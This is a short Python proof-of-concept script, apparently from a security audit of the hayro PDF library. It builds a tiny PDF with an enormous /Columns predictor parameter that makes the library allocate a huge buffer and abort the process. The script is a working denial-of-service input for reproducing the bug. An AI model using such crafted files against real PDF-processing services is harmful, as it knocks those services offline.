#!/usr/bin/env python3
"""N1 reproduction input: a tiny PDF whose only content stream carries
/DecodeParms with an enormous /Columns. hayro's apply_predictor allocates a
row buffer sized from Columns x Colors x BitsPerComponent, independent of the
stream's real (small) decoded length. Run the offline probe on the output and
observe an allocation abort (SIGABRT), which catch_unwind cannot catch.

    python3 evidence/round6/repro/predictor_abort.py /tmp/n1.pdf
    <probe> --text /tmp/n1.pdf      # memory allocation of N bytes failed; abort
"""
import sys, zlib, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[3] / "fixtures"))
from generate import HELVETICA, Doc, line  # noqa: E402

def build(columns=1 << 36, bpc=4):
    d = Doc()
    cat, tree = d.reserve(), d.reserve()
    font = d.add(HELVETICA)
    data = zlib.compress(b"\x00" + line("Predictor abort", 72, 700))
    body = d.add(b"<< /Length %d /Filter /FlateDecode /DecodeParms "
                 b"<< /Predictor 2 /Columns %d /Colors 1 /BitsPerComponent %d >> >>\nstream\n"
                 % (len(data), columns, bpc) + data + b"\nendstream")
    page = d.add(b"<< /Type /Page /Parent %d 0 R /MediaBox [0 0 612 792] "
                 b"/Resources << /Font << /F1 %d 0 R >> >> /Contents %d 0 R >>" % (tree, font, body))
    d.set(tree, b"<< /Type /Pages /Kids [%d 0 R] /Count 1 >>" % page)
    d.set(cat, b"<< /Type /Catalog /Pages %d 0 R >>" % tree)
    return d.build(cat)

if __name__ == "__main__":
    out = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else "n1-predictor-abort.pdf")
    out.write_bytes(build())
    print(f"{out} ({out.stat().st_size} bytes)")
